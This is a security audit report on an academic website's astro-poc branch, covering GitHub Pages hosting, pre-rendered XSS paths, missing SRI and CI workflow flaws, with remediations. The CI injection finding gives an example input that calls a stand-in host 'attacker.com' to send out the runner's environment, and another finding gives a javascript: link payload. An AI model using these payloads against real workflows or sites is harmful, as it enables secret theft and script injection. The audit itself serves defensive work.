# Comprehensive Security Audit & Attack Surface Assessment: Academic Website (astro-poc)

**Target Repository**: `sfanzon/Quarto-Website-git`  
**Target Branch**: `astro-poc`  
**Target Hosting Environment**: GitHub Pages (Static Hosting via Fastly CDN Edge, Custom Domain `www.silviofanzon.com`)  
**Audit Date**: September 2026  
**Auditor**: Teamwork Security Audit Group (`teamwork_preview_worker`)  
**Audit Standards**: OWASP Top 10, OWASP Top 10 CI/CD Security Risks, W3C Web Application Security Standards, CVSS v3.1  

---

## 1. Executive Summary

### 1.1 Scope & Context
This report delivers an exhaustive, rigorous security audit and attack surface assessment of the personal academic website for Dr. Silvio Fanzon, evaluated on the `astro-poc` branch. The website is currently undergoing an architectural migration from a legacy Quarto-rendered static site towards an Astro-driven hybrid static architecture. The final compiled artifact is designated for deployment to GitHub Pages at `https://www.silviofanzon.com/`.

The assessment evaluated three fundamental operational domains:
1. **Static Hosting Threat Model & GitHub Pages Exposure (R1)**: Platform boundaries, domain/subdomain takeover risks, DNS configuration, browser security headers, Content Security Policy (CSP) viability under static constraints, and git repository/build artifact hygiene.
2. **Client-Side Code & Injection Vulnerabilities (R2)**: Client-side TypeScript/JavaScript execution in `astro/src/` and `includes/`, DOM sinks (`innerHTML`, `document.write`, `eval`), pre-rendering data pipelines (`scripts/sitegen/`), Markdown/BibTeX/YAML ingestion into Astro `set:html`, URL scheme validation, and rendering engines (KaTeX, MathJax, Mermaid).
3. **Dependency, Supply Chain & CI/CD Security (R3)**: Direct and transitive npm packages in root and `astro/`, Python build dependencies, Subresource Integrity (SRI) on external scripts and stylesheets, and GitHub Actions automation workflows in `.github/workflows/`.

### 1.2 Overall Risk Posture Rating
**Overall Risk Rating: LOW-TO-MODERATE**

- **Inherent Architectural Strengths**:
  - **Zero Server-Side Execution**: Because the site is published as purely static HTML/CSS/JS files served by GitHub Pages via Fastly caching proxies, entire classes of high-severity vulnerabilities—such as Server-Side Remote Code Execution (RCE), SQL Injection (SQLi), Server-Side Request Forgery (SSRF), and authentication/session hijacking—are completely eliminated by design.
  - **Exemplary Client-Side Script Hygiene**: Hand-authored client-side TypeScript components in `astro/src/` (`SiteSearch.astro`, `Header.astro`, `BackToTop.astro`, `PublicationArchive.astro`, `news.astro`) strictly use safe DOM APIs (`replaceChildren()`, `createElement()`, `textContent`, `setAttribute`). No dangerous execution sinks (`eval()`, `document.write()`, string `setTimeout()`) exist in the client-side codebase.
  - **Safe Default Build Integrations**: Markdown rendering in Astro utilizes Shiki for syntax highlighting, KaTeX runs with `trust: false` by default, and Python data loaders strictly enforce `yaml.safe_load()`.
  - **Secure Pull Request Workflow**: CI workflows triggered by forks use `on: pull_request` rather than the dangerous `pull_request_target`, preventing untrusted pull requests from accessing repository secrets or write tokens.

- **Actionable Vulnerabilities & Deficiencies**:
  - **CI/CD Command Injection**: `.github/workflows/update-visual-baselines.yml` inlines an unquoted `workflow_dispatch` input string (`${{ inputs.reason }}`) into an inline bash script, introducing an OS command injection vulnerability on the GitHub Actions runner.
  - **Pre-Rendering Stored XSS Pathways**: Content generation scripts in `scripts/sitegen/` (`news.py`, `publication_rendering.py`, `publications.py`, `presentations.py`, `teaching.py`) omit HTML sanitization and URL protocol validation before injecting formatted strings into Astro templates via `set:html`.
  - **GitHub Pages Browser Header Absence**: GitHub Pages does not emit `Strict-Transport-Security` (HSTS), `X-Frame-Options`, or `Content-Security-Policy` on custom domains. Due to W3C specification constraints, HTML `<meta>` tags cannot enforce `frame-ancestors` (clickjacking defense) or HSTS.
  - **Subdomain Takeover Exposure**: Planned external subdomains (`notes.silviofanzon.com`, `technical.silviofanzon.com`) documented in `PUBLISHING_ARCHITECTURE.md` lack pre-emptive GitHub Custom Domain Verification, exposing the domain to dangling CNAME subdomain takeover if DNS records are created before repositories are claimed.
  - **Supply Chain Dead Weight**: `astro/package.json` includes an unneeded `bibliography@0.1.0` dependency that pulls a vulnerable transitive package (`ret@0.1.15`, CVE-2021-23648 ReDoS).
  - **Missing Subresource Integrity (SRI)**: Legacy Quarto-rendered pages merged into the distribution load MathJax and polyfill scripts from public CDNs without SRI hashes.

### 1.3 Summary of Findings by Severity

| Finding ID | Title | Severity | CVSS v3.1 | CWE | Affected Component / File |
|---|---|---|---|---|---|
| **VULN-CI-01** | OS Command / Script Injection via Unquoted Workflow Dispatch Input | **Medium** | 6.7 | CWE-78 | `.github/workflows/update-visual-baselines.yml:84` |
| **VULN-STATIC-01** | Dangling Subdomain & Unverified Custom Domain Takeover Risk | **Medium** | 6.5 | CWE-284 | DNS Records / `PUBLISHING_ARCHITECTURE.md` |
| **VULN-SRI-01** | Missing Subresource Integrity (SRI) on CDN MathJax & Polyfill Scripts | **Medium** | 6.5 | CWE-353 | Merged Quarto Pages / `docs/index.html:95-96` |
| **VULN-INJ-01** | Stored Cross-Site Scripting via Unsanitized Data Ingestion into `set:html` | **Medium** | 6.1 | CWE-79 | `scripts/sitegen/*.py` & Astro Pages |
| **VULN-DEP-01** | Dead Dependency `bibliography` Pulling Vulnerable `ret` Package (ReDoS) | **Medium** | 5.3 | CWE-1333 | `astro/package.json:23`, `astro/package-lock.json:5518` |
| **VULN-STATIC-03** | Lack of HSTS & Security Response Headers on Custom Domain | **Medium** | 5.3 | CWE-319 | GitHub Pages Custom Domain Hosting |
| **VULN-STATIC-04** | Inability to Enforce Framing / Clickjacking Protection via HTML Meta Tag | **Medium** | 4.3 | CWE-1021 | HTML Meta CSP / `BaseHead.astro` |
| **VULN-INJ-02** | Pseudo-Protocol Passthrough (`javascript:`) on Dynamic Link Generators | **Low** | 4.3 | CWE-79 | `scripts/sitegen/presentations.py`, `teaching.py` |
| **VULN-SRI-02** | External CDN Stylesheets Loaded via CSS `@import` Without SRI | **Low** | 3.7 | CWE-353 | `styles/main/_01-foundation.scss:8-9` |
| **VULN-INJ-04** | Protocol-Relative Open Iframe Redirection & Missing Sandbox in Viewports Route | **Low** | 3.7 | CWE-1021 | `astro/src/pages/dev/viewports.astro:112-116` |
| **VULN-INJ-03** | Attribute Breakout in `team.astro` via Single-Quote Handling | **Low** | 3.5 | CWE-79 | `astro/src/pages/team.astro:171`, `avatar.ts:27` |
| **VULN-CI-02** | Missing Explicit Least-Privilege `permissions:` Declaration in Workflows | **Low** | 3.5 | CWE-250 | `.github/workflows/functional-tests.yml`, etc. |
| **VULN-CI-03** | Actions Pinned to Mutable Release Tags Instead of Immutable Commit SHAs | **Low** | 3.3 | CWE-829 | All 4 Workflows in `.github/workflows/` |
| **VULN-STATIC-07** | Incomplete Root `.gitignore` Lacking Environment File (`.env`) Safeguards | **Low** | 3.3 | CWE-200 | Root `.gitignore` |
| **VULN-STATIC-02** | Missing In-Artifact Declarative CNAME in Deployment Pipeline | **Low** | 3.1 | CWE-668 | `astro/public/CNAME`, `build-site.mjs` |
| **VULN-STATIC-05** | Exposure of Donor Template Contact Data & Resume Link in `consts.ts` | **Low** | 3.1 | CWE-200 | `astro/src/consts.ts`, `astro/src/content/blog/` |
| **VULN-NET-01** | Build-Time Remote Font Fetching in `generateOgImage.ts` | **Low** | 3.1 | CWE-400 | `astro/src/utils/generateOgImage.ts:5-14` |
| **VULN-STATIC-06** | Potential Public Exposure & Indexing of Development Tooling Routes (`/dev/`) | **Low** | 2.6 | CWE-200 | `astro/src/pages/robots.txt.ts`, `dist/dev/` |
| **VULN-STATIC-08** | Sitemap Endpoint Desynchronization in `robots.txt.ts` | **Informative** | N/A | N/A | `astro/src/pages/robots.txt.ts:8` |
| **VULN-INJ-06** | Implicit Mermaid Runtime Security Configuration | **Informative** | N/A | CWE-1188 | `docs/site_libs/quarto-diagram/mermaid-init.js` |

---

## 2. Threat Model

### 2.1 System Architecture Overview
The system under review is a personal academic website for Dr. Silvio Fanzon, an applied mathematician.
- **Upstream Authorship**: Content is authored locally in Markdown (`notes/*.qmd`, `news/*.md`), BibTeX (`data/*.bib`), and YAML (`data/*.yml`).
- **Build Pipeline**: 
  1. Python scripts (`scripts/build-content.py` calling `scripts/sitegen/`) compile structured data into pre-rendered HTML snippets under `includes/`.
  2. Astro compiles components, pages, and styles (`npm run build:astro`) into `astro/dist/`.
  3. Quarto compiles research project explainers into a temporary staging directory.
  4. Node build script (`astro/scripts/build-site.mjs`) merges Quarto project pages, generated sitemaps, and assets into `astro/dist/`.
  5. Pagefind indexes HTML pages to build a static search index under `astro/dist/pagefind/`.
- **Target Deployment Platform**: GitHub Pages. Workflow `.github/workflows/deploy-pages.yml` packages `astro/dist` via `actions/upload-pages-artifact@v3` and deploys via `actions/deploy-pages@v4`. Fastly edge caches and serves the static files.

### 2.2 Threat Actor Profiles
1. **Unauthenticated Public Visitor / Opportunistic Scanner**:
   - Capabilities: Can make HTTP/S requests, inspect client-side source code, pass URL parameters/hashes, test for exposed routes (`/dev/`), and analyze DNS records.
   - Motivations: Identifying exposed private notes, discovering unreleased research drafts, finding open redirects, or defacing content.
2. **Malicious Collaborator / Untrusted Pull Request Author**:
   - Capabilities: Can submit pull requests containing modified Markdown notes, news posts, BibTeX entries, or workflow modifications.
   - Motivations: Injecting persistent client-side exploits, poisoning CI/CD runners, or stealing credentials.
3. **Network Adversary / Man-in-the-Middle (MitM)**:
   - Capabilities: Controls or monitors local network infrastructure (e.g., untrusted university or conference Wi-Fi).
   - Motivations: Intercepting unencrypted traffic, stripping SSL/TLS certificates, or poisoning unauthenticated CDN requests.
4. **Compromised Upstream CDN or Dependency Provider**:
   - Capabilities: Controls third-party scripts loaded at runtime (e.g. `cdnjs`, `jsdelivr`, `fonts.googleapis.com`) or packages on npm/PyPI.
   - Motivations: Delivering malicious payloads (cryptominers, info-stealers) to academic site visitors.
5. **Framing / Impersonation Adversary**:
   - Capabilities: Hosts external websites capable of embedding `https://www.silviofanzon.com` within iframes.
   - Motivations: Academic identity theft, phishing, or deceptive framing.

### 2.3 Protected Assets
1. **Academic Integrity & Identity**: Preventing unauthorized alterations to publication lists, research findings, curriculum vitae, or teaching materials.
2. **Visitor Browser Security & Privacy**: Ensuring visitors reading research papers or notes are not subjected to client-side exploits, tracking, or session hijacking.
3. **CI/CD Execution Environment & Repository Secrets**: Protecting the `GITHUB_TOKEN` and GitHub Actions runner environment from command injection or unauthorized write actions.
4. **Domain Reputation & Subdomain Authority**: Safeguarding `silviofanzon.com` and associated subdomains from unauthorized takeover or hijacking.
5. **Unpublished Intellectual Property**: Preventing early disclosure of draft papers, unpublished lecture notes, or grading keys.

### 2.4 Attack Surface & Vectors
```text
+---------------------------------------------------------------------------------------+
|                                    ATTACK SURFACE MAP                                 |
+---------------------------------------------------------------------------------------+

  [Internet / Network Layer]
       │
       ├──> DNS / CNAME Takeover ───────────> Dangling records on planned subdomains
       │                                     (notes.silviofanzon.com)
       ├──> Cleartext HTTP / SSL Strip ─────> Missing HSTS on custom domain
       └──> Iframe Framing / Clickjacking ──> Missing X-Frame-Options / frame-ancestors
       
  [Client Browser Layer]
       │
       ├──> Stored DOM XSS ─────────────────> Malicious BibTeX/Markdown -> set:html
       ├──> Pseudo-Protocol Injection ──────> javascript: links in presentation buttons
       ├──> Third-Party CDN Hijacking ──────> Unhashed MathJax/Polyfill in Quarto pages
       └──> Iframe Redirection ─────────────> Protocol-relative URL in /dev/viewports/
       
  [CI/CD & Supply Chain Layer]
       │
       ├──> OS Command Injection ───────────> workflow_dispatch input in update-visual-baselines
       ├──> Supply Chain Vulnerabilities ───> Dead bibliography package (ret@0.1.15 ReDoS)
       └──> Action Tag Mutation ────────────> Mutable GitHub Action release tags (@v4, @v2)
```

---

## 3. Static Site Threat Model & GitHub Pages Exposure Analysis (R1)

### 3.1 Static Hosting Security Boundary
GitHub Pages is a multi-tenant static file hosting service backed by Fastly reverse caching proxies. It executes zero application server code:
- **Absence of Server-Side Sinks**: Server-side script execution, database querying, server-side template injection (SSTI), and SSRF are structurally impossible on the hosting runtime.
- **Stateless Delivery**: The server cannot store state, process user sessions, or execute server-side authentication.
- **Dual-State Transition**: The repository currently maintains a legacy deployment from the `docs/` folder on the `main` branch, while `astro-poc` introduces automated GitHub Actions deployment via `deploy-pages.yml`. Until merged and reconfigured in repository settings, the legacy build remains active.

### 3.2 CNAME & Subdomain Takeover Analysis

#### 3.2.1 Missing In-Artifact Declarative CNAME
In standard GitHub Pages deployments, custom domain routing is declared by a `CNAME` file placed in the published web root.
- **Observation**:
  - `_quarto.yml` (line 14) and `astro/astro.config.mjs` (line 11) specify `https://www.silviofanzon.com`.
  - `astro/public/` contains static assets but **no `CNAME` file**.
  - `astro/scripts/build-site.mjs` does not generate a `CNAME` file.
  - No `CNAME` file exists in git history (`git log --all --full-history -- "**/CNAME"` returns 0).
- **Risk**: Deployment via `actions/deploy-pages@v4` relies solely on mutable repository settings. If repository settings are ever toggled or if the workflow deploys to a new target, GitHub Pages will disassociate the custom domain, reverting the site to `sfanzon.github.io` or causing 404 routing errors.
- **Remediation**: Create `astro/public/CNAME` containing `www.silviofanzon.com`.

#### 3.2.2 Subdomain Takeover on Planned Namespaces
The project architecture specification `PUBLISHING_ARCHITECTURE.md` (lines 106–123, 245–250) details the target multi-repository topology across future subdomains:
- `notes.silviofanzon.com` -> `sfanzon-notes.github.io`
- `technical.silviofanzon.com` -> `sfanzon-technical.github.io`
- `assets.silviofanzon.com` -> `Website-Assets`
- **The Dangling CNAME Threat**: If a DNS CNAME record is created for `notes.silviofanzon.com` pointing to `sfanzon-notes.github.io` before the corresponding GitHub organization (`sfanzon-notes`) or repository is established and configured in GitHub Pages, any third-party GitHub user can claim that domain on their own repository. GitHub Pages will verify that the DNS points to GitHub, issue an SSL certificate, and serve arbitrary attacker-controlled content on Dr. Silvio Fanzon's subdomain.
- **Cross-Subdomain Impact**: If any future service sets cookies with wildcard scope (`Domain=.silviofanzon.com`), an attacker on `notes.silviofanzon.com` could intercept or manipulate those cookies.
- **Remediation**: Configure **GitHub Custom Domain Verification** at the user/organization level by adding verification DNS TXT records (`_github-pages-challenge-*`) before adding any DNS CNAME records.

### 3.3 HTTPS Enforcement & HSTS Limitations
- **HTTPS Enforcement**: GitHub Pages provides an "Enforce HTTPS" toggle. When enabled, requests on port 80 are redirected (HTTP 301) to `https://`. TLS certificates are provisioned via Let's Encrypt.
- **Lack of HSTS on Custom Domains**:
  - GitHub Pages emits `Strict-Transport-Security` on `*.github.io` domains.
  - However, on **custom domains** (`silviofanzon.com`, `www.silviofanzon.com`), GitHub Pages does **NOT** emit `Strict-Transport-Security` headers, and offers no mechanism (`.htaccess`, `_headers`) to define them.
  - **Vulnerability**: Initial visits to `http://www.silviofanzon.com` rely on a plaintext HTTP 301 redirect. A local network adversary (e.g. on public Wi-Fi) can perform SSL stripping, keeping the victim on plaintext HTTP.
- **Remediation**: Route DNS through Cloudflare (free tier) with Full (Strict) SSL and HSTS enabled, or submit `silviofanzon.com` to the Chrome HSTS Preload list (`hstspreload.org`).

### 3.4 Response Headers & Browser Protections via HTML Meta Tags
Because GitHub Pages does not support custom HTTP response headers, we analyzed the viability of delivering browser protections via HTML `<meta http-equiv="...">` tags:

| Header / Directive | Viable via `<meta>` Tag? | Technical Explanation |
|---|---|---|
| **Content-Security-Policy** | **Partial** | `<meta http-equiv="Content-Security-Policy">` is supported for origin restrictions (`default-src`, `script-src`, `style-src`), but has severe functional constraints. |
| **CSP `frame-ancestors`** | **NO (FORBIDDEN)** | The W3C CSP Level 3 specification mandates that browsers **must ignore** `frame-ancestors` in meta tags. Framing protection cannot be achieved via meta tags. |
| **CSP Reporting** | **NO (IGNORED)** | `report-uri` and `report-to` are ignored in meta tags. |
| **Referrer-Policy** | **YES** | `<meta name="referrer" content="strict-origin-when-cross-origin">` is fully supported by all modern browsers. |
| **X-Frame-Options** | **NO (IGNORED)** | Browsers explicitly reject `<meta http-equiv="X-Frame-Options">`. |
| **X-Content-Type-Options** | **NO (IGNORED)** | Must be received in the initial HTTP response before document parsing begins. |
| **Strict-Transport-Security** | **NO (IGNORED)** | Must be received as an HTTP header over TLS. |
| **Permissions-Policy** | **NO (IGNORED)** | Supported only as an HTTP response header or an `<iframe>` attribute. |

#### The "Unsafe-Inline Dilemma"
To establish a valid CSP for this site, we analyzed all executing scripts and styles:
1. **Inline Scripts**:
   - `astro/src/components/BaseHead.astro:19`: Theme resolution script runs synchronously before paint to prevent dark mode flicker.
   - `astro/src/layouts/BlogPost.astro:545`: Code block copy buttons and language labels.
   - `includes/scroll-restoration-head.html:1` & `includes/after-body.html:1`: Scroll state restoration.
   - `includes/mermaid-svg-ids.html:1`: DOM MutationObserver for Mermaid SVG IDs.
2. **Inline Styles**:
   - `astro/astro.config.mjs:27` specifies `build: { inlineStylesheets: 'always' }`, compiling all component CSS into inline `<style>` tags in `<head>`.
   - KaTeX outputs thousands of inline `style="..."` attributes on spans and struts for mathematical typography.
3. **Impossibility of Dynamic Nonces**: On static hosting, nonces cannot be generated per-request. A static nonce is readable by any attacker and offers zero protection.
4. **Fragility of Hashes**: Using `sha256-...` hashes in static CSP causes browsers to automatically ignore `'unsafe-inline'`, immediately breaking KaTeX inline style attributes across mathematical expressions.
- **Architectural Conclusion**: A static meta CSP for this website **must specify `'unsafe-inline'`** in `script-src` and `style-src`. Consequently, the meta CSP **cannot prevent stored or DOM XSS**. Its security value is limited to restricting external script origins, disabling plugins (`object-src 'none'`), preventing base URI manipulation (`base-uri 'self'`), and restricting form actions (`form-action 'self'`).

### 3.5 Information Disclosure & Asset Leakage Audit
- **Git Commit History & Identity**: Audited via `git log --format='%an <%ae>' | sort -u`. All commits are attributed to `sfanzon <126147228+sfanzon@users.noreply.github.com>`. No personal email addresses are leaked in git metadata.
- **Secret Scanning**: Global search across git history for private keys (`BEGIN PRIVATE KEY`, `BEGIN RSA PRIVATE KEY`), GitHub PATs (`ghp_`, `github_pat_`), AWS credentials, and API keys returned **zero leaks**.
- **Bytecode Artifact in History**: In commit `f213b03` (`Initial commit`), `scripts/__pycache__/build-content.cpython-313.pyc` was committed. Although deleted in later commits, it remains in git history. Decompilation confirmed it contains only standard content build logic; no embedded secrets.
- **Gitignore Safeguards**: The root `.gitignore` omits entries for `.env*`, `*.pem`, `*.key`, and `astro/dist/`. Staging files at the root risks accidental commitment of local development environment variables.
- **Donor Template Data Residues & Dormant Workflows**:
  - `astro/src/consts.ts` contains placeholder details from the `astro-scholar` starter template: `CV_URL = 'https://shravangoswami.com/resume.pdf'`, `contact@shravangoswami.com`, and social links for Shravan Goswami.
  - `astro/src/content/blog/` retains 9 demo markdown posts.
  - While `build-site.mjs` strips `/blog` during the production merge, executing `npm run build` or `astro build` directly builds and publishes these donor routes.
  - `astro/.github/workflows/` contains 3 dormant workflow files inherited from the starter template: `preview.yml`, `release.yml`, and `website-deploy.yml`. Because they reside in a nested subdirectory rather than the repository root, GitHub Actions ignores them during normal CI runs. However, `preview.yml` requests elevated permissions (`contents: write`, `pull-requests: write`), and `website-deploy.yml` references repository secret `secrets.PUBLIC_UMAMI_WEBSITE_ID`. If these workflows were mistakenly moved to root `.github/workflows/`, they would execute untrusted pull requests with write privileges.
- **Development Workbench Exposure (`/dev/`)**:
  - `astro/src/pages/dev/viewports.astro` and `kitchen-sink.astro` exist in the Astro pages directory and are compiled into `dist/dev/` when dev tools are included.
  - `astro/src/pages/robots.txt.ts` lacks a `Disallow: /dev/` rule, permitting search engine indexing of the internal test workbench.
  - `robots.txt.ts:8` references `sitemap-index.xml`, while the build generates `sitemap.xml`, resulting in a 404 for search engine sitemap crawlers.

---

## 4. Client-Side Code & Injection Vulnerability Review (R2)

### 4.1 Client-Facing Script & DOM Sink Audit
A complete audit was conducted across all 15 client-facing scripts in `astro/src/` and canonical `includes/`:

1. **Dangerous Sink Analysis (`innerHTML`, `outerHTML`, `document.write`, `eval`)**:
   - `astro/src/layouts/BlogPost.astro:630`: Uses `copyButton.innerHTML = '<span class="copy-code-button__default">Copy</span>...'`. This uses an immutable, hardcoded static string literal. Safe.
   - `includes/project-navigation.html:124` (source line 124; rendered at line ~377 in generated standalone project navigation includes): Uses `toggle.innerHTML = '<i class="bi bi-chevron-right" aria-hidden="true"></i>'`. Static string literal. Safe.
   - `outerHTML` and `document.write`: **0 occurrences** across the entire codebase.
   - `eval()` and `Function()`: **0 occurrences** across the entire codebase.
   - `setTimeout` / `setInterval`: All occurrences pass function callbacks; none evaluate string arguments.
2. **Search Component (`SiteSearch.astro`)**:
   - Integrates Pagefind via dynamic `import('/pagefind/pagefind.js')`.
   - Results rendering (lines 53–70) constructs elements with `document.createElement('li')` and assigns `link.textContent = result.meta.title`.
   - Result excerpts are stripped of HTML tags via regex (`replace(/<[^>]*>/g, ' ')`) and inserted via `excerpt.textContent`.
   - Results container is cleared via `resultsList.replaceChildren()`.
   - **Assessment**: Completely immune to DOM-based XSS.
3. **Theme Toggle & State Persistence**:
   - `BaseHead.astro:23` and `Header.astro:126`: Read `localStorage.getItem('theme')`.
   - Values are strictly validated against an allowlist: `if (saved === 'light' || saved === 'dark')`. Unsanitized strings cannot pollute the DOM.
4. **URL Hash & Query Parameters**:
   - `includes/project-navigation.html:103`: `decodeURIComponent(window.location.hash.slice(1))` is strictly matched against pre-scanned heading IDs in the DOM using `entries.findIndex()`. It is never used as a selector or injected into the DOM.
   - `includes/after-body.html:1`: Query parameters are used only as part of a session storage cache key, storing scroll positions validated via `Number.isFinite()`.

### 4.2 Pre-Rendering Data Ingestion Pipeline Analysis
While client-side TypeScript avoids dangerous sinks, severe stored injection risks exist in the Python pre-rendering pipeline in `scripts/sitegen/`. Structured content from Markdown, BibTeX, and YAML is converted into HTML fragments under `includes/`, which are subsequently imported into Astro pages and rendered unescaped via the `set:html` directive:

```text
[news/*.md]        ──> scripts/sitegen/news.py                ──> includes/news-all.html        ──> news.astro (set:html)
[data/*.bib]       ──> scripts/sitegen/publication_*.py       ──> includes/publications-all.html──> PublicationArchive.astro (set:html)
[data/pres_*.bib]  ──> scripts/sitegen/presentations.py       ──> includes/presentations.html   ──> presentations.astro (set:html)
[data/teaching.yml]──> scripts/sitegen/teaching.py            ──> includes/teaching-list.html   ──> teaching.astro (set:html)
```

1. **News Markdown Pipeline (`sitegen/news.py:26-42`)**:
   `news_body_html` splits Markdown text by blank lines and formats paragraphs and lists using simple regex. It performs **zero HTML entity escaping**. However, existing news items (such as `news/2026-03-17.md:10`) deliberately contain legitimate HTML anchor tags (`<a href="/publications.html#2026-Fry-Fan-Aus-Bri">Benchmarking Formula 1 results...</a>` and `<a href="https://www.silviofanzon.com/assets/pdf/journal/2026-Fry-Fan-Aus-Bri.pdf">here</a>`). While this permits authored hyperlinks, raw HTML tags, `<script>` blocks, or event handlers in untrusted contributions would be preserved verbatim and output to `includes/news-all.html`, which Astro renders via `set:html={newsArchive}`, creating stored XSS. Crucially, a naive whole-string `html.escape()` remediation would cause a functional regression, breaking existing news hyperlinks by rendering them as literal `&lt;a href=...&gt;` text.
2. **BibTeX Publication Title & Abstract Pipeline (`sitegen/publication_rendering.py:170` & `publications.py:76-89`)**:
   In `render_publication_entry`, `publication['title']` is interpolated into `<h3>{publication['title']}</h3>` without `html.escape()`.
   In `publications.py`, `publication_abstract_html` explicitly bypasses wrapping if the abstract starts with block HTML tags (`re.match(r'^<(?:p|div|ul|ol|blockquote|pre)\b', abstract)`), emitting unescaped HTML. Rendered in `PublicationArchive.astro` via `set:html={publicationArchive}`.
3. **Presentations & Teaching Pipelines (`sitegen/presentations.py:65` & `teaching.py:132`)**:
   Both scripts output unescaped `record["abstract"]` and `course["abstract"]` into HTML divisions. (In contrast, `sitegen/supervision.py:47` correctly applies `html.escape(record["abstract"])`).

### 4.3 Dynamic Link Generation & Protocol Bypass
In `scripts/sitegen/presentations.py:40`, `scripts/sitegen/teaching.py:41`, and `scripts/sitegen/publication_rendering.py:157`:
```python
href = value if value.startswith(('http://', 'https://', '/')) else f'/assets/pdf/{value}' if asset else value
return f'<a class="paper-action" href="{html.escape(href, quote=True)}" role="button">...'
```
- **The Flaw**: When `asset=False`, any value that does not start with `http://`, `https://`, or `/` is passed through unmodified.
- **Impact**: If a BibTeX or YAML record supplies a URI with a pseudo-protocol such as `javascript:alert(1)` for `event_link`, `venue_link`, `video`, or `webpage`, the generator emits `<a class="paper-action" href="javascript:alert(1)" role="button">`. When clicked by a visitor, the script executes within the origin.

### 4.4 Inline Event Handler Quote Breakout in `team.astro`
In `astro/src/pages/team.astro:171,193,217,244,263`:
```astro
<img src={profile.avatar || profile.fallbackAvatar} alt={profile.name} width="160" height="160" onerror={`this.onerror=null;this.src='${profile.fallbackAvatar}'`} />
```
- **The Flaw**: `profile.fallbackAvatar` is generated by `generateFallbackAvatar(name)` in `astro/src/utils/avatar.ts:27` via `data:image/svg+xml;charset=UTF-8,${encodeURIComponent(svg)}`.
- Under RFC 3986 and ECMAScript specifications, `encodeURIComponent` does **NOT** encode single quotes (`'`).
- If a team member's name contains an apostrophe (e.g. `O'Connor`), the unencoded single quote prematurely terminates the JavaScript string literal delimiter `this.src='...` inside the inline `onerror` attribute, causing a syntax error or allowing script injection.

### 4.5 External Asset & Rendering Integrations
- **KaTeX (Safe)**: Astro configures KaTeX via `rehype-katex` and `remark-math`. Auto-rendering in `DisclosureArchive.astro:37` uses `renderMathInElement`. Both integrations run with `trust: false` by default, rejecting potentially dangerous LaTeX commands (`\url`, `\href`, `\html`). KaTeX CSS is bundled from local npm assets.
- **MathJax (Quarto Pages)**: Quarto-rendered pages in `docs/` load `MathJax` and `polyfill.min.js` from public CDNs without SRI hashes.
- **Mermaid Diagrams**: Initialized via `docs/site_libs/quarto-diagram/mermaid-init.js`. Inspection of `mermaid.min.js` confirms it defaults to `securityLevel: 'strict'`, which invokes DOMPurify on SVG labels and disables click callbacks. However, this is not explicitly declared in `mermaidOpts`.

---

## 5. Dependency, Supply Chain & CI/CD Security Audit (R3)

### 5.1 Software Supply Chain Audit

#### Root Dependencies
- `package.json`: Contains zero production dependencies; development dependencies include Playwright and Axe-core test suites (`@playwright/test@1.62.0`, `@axe-core/playwright@^4.12.1`).
- Lockfile verification: 100% of packages have valid `sha512` hashes and resolve to official npm registry HTTPS endpoints. Clean.

#### Astro Dependencies
- `astro/package.json` specifies 11 direct dependencies and 2 dev dependencies.
- **Dead Dependency & ReDoS (Finding VULN-DEP-01)**:
  `astro/package.json:23` declares `"bibliography": "^0.1.0"`.
  Codebase search confirms that `bibliography` is **never imported or used anywhere** in the project. BibTeX handling is executed by Python scripts and custom Astro components.
  `bibliography@0.1.0` introduces 8 unneeded transitive packages into `node_modules`, including `ret@0.1.15` (`astro/package-lock.json:5518`, pulled by `randexp` at line 5193), which is vulnerable to **CVE-2021-23648 / GHSA-j527-rv73-vv8r** (Regular Expression Denial of Service in `ret < 0.2.2`). Removing `bibliography` completely eliminates this vulnerability.
- **PrismJS**: Transitive package `prismjs@1.30.0` (subject to CVE-2024-53382 ReDoS) is present via Astro Markdown remark, but Astro is explicitly configured in `astro.config.mjs:15` to use Shiki instead of PrismJS.

#### Python Dependencies
- `requirements.txt` specifies `PyYAML==6.0.3`.
- All YAML parsing in `scripts/sitegen/` (`core.py:17`, `generator.py:24`, `portfolio.py:15`, `teaching.py:16`) strictly enforces `yaml.safe_load()`, preventing arbitrary Python object deserialization. Clean.

### 5.2 Subresource Integrity (SRI) Audit
1. **Quarto MathJax & Polyfill Scripts (Finding VULN-SRI-01)**:
   Quarto-rendered HTML pages merged into `astro/dist/` load:
   ```html
   <script src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6"></script>
   <script defer="" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml-full.js" type="text/javascript"></script>
   ```
   Neither script includes an `integrity` hash or `crossorigin="anonymous"`. If either CDN is compromised or hijacked, malicious code will execute across all Quarto pages on the website. Loading a polyfill for ES6 in 2026 adds pure attack surface with zero functional benefit.
2. **External Stylesheets via CSS `@import` (Finding VULN-SRI-02)**:
   In `styles/main/_01-foundation.scss:8-9`:
   ```scss
   @import url('https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css');
   @import url('https://cdn.jsdelivr.net/npm/academicons@1.9.5/css/academicons.min.css');
   ```
   CSS `@import` syntax cannot perform SRI verification. An attacker compromising these CDNs could inject malicious CSS rules to exfiltrate sensitive data or perform UI overlay attacks.
3. **Build-Time Remote Font Fetching (Finding VULN-NET-01)**:
   In `astro/src/utils/generateOgImage.ts:5-14`, the build pipeline dynamically downloads font binaries from `fonts.googleapis.com` over HTTP. This creates an external network failure point during builds and feeds downloaded binaries into native font parsers.

### 5.3 GitHub Actions CI/CD Workflow Security
Four workflow files exist in `.github/workflows/`:
1. `deploy-pages.yml` (Deploy to GitHub Pages)
2. `functional-tests.yml` (Functional & Regression Test Suite)
3. `update-visual-baselines.yml` (Regenerate Visual Baselines)
4. `visual-tests.yml` (Visual Regression Diff Suite)

#### Finding VULN-CI-01: OS Command / Script Injection in `update-visual-baselines.yml`
- **Line 84**:
  ```yaml
  - name: Instructions
    run: |
      echo "=============================================="
      echo "  Baselines regenerated."
      echo "  Reason: ${{ inputs.reason }}"
      echo ""
      echo "  Download the 'updated-visual-baselines'"
      echo "  artifact, review the screenshots, and commit"
      echo "  them to tests/visual/baselines/."
      echo "=============================================="
  ```
- **Mechanism**: GitHub Actions evaluates `${{ ... }}` expressions before generating the bash script executed on the runner. An attacker or collaborator triggering the workflow with a crafted input string (e.g. `Updating"; curl -s https://attacker.com/steal?token=$(env | base64); echo "`) causes the runner to execute arbitrary shell commands with full runner permissions.

#### Finding VULN-CI-02: Missing Explicit Least-Privilege `permissions:` Blocks
`functional-tests.yml`, `update-visual-baselines.yml`, and `visual-tests.yml` do not declare a `permissions:` block. They inherit default repository settings, which frequently grant read/write access to the `GITHUB_TOKEN`.

